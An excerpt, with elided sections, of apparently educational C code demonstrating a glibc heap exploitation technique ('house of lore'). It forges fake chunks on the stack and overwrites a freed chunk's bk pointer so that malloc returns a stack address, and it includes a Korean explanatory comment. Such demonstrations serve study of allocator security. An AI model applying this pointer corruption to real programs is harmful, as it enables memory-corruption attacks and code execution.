...
int main(int argc, char * argv[]){
  ...
  fake_chunk[0] = 0;
  fake_chunk[1] = 0;
  fake_chunk[2] = victim_chunk;

  printf("Set the bk pointer to stack_buffer_2 and set the fwd pointer of stack_buffer_2 to point to fake_chunk "
         "in order to bypass the check of small bin corrupted in last malloc, which returning pointer to the fake "
         "chunk on stack");
  fake_chunk[3] = (intptr_t*)stack_buffer_2;
  stack_buffer_2[2] = (intptr_t*)fake_chunk;
  ...
  /* 이걸 안하면, unsorted bin에 있는 victim이 smallbin으로 옮겨지지 않는다.
  따라서 p3 = malloc(200); 하면서 unsorted bin size check에 걸린다.
  ...
  victim[1] = (intptr_t)fake_chunk; // victim->bk is pointing to stack
  ...
  void *p3 = malloc(200);  // return victim chunk and link fake chunk to smallbin


  printf("This last malloc should trick the glibc malloc to return a chunk at the position injected in bin->bk\n");
  char *p4 = malloc(200);  // return fake chunk
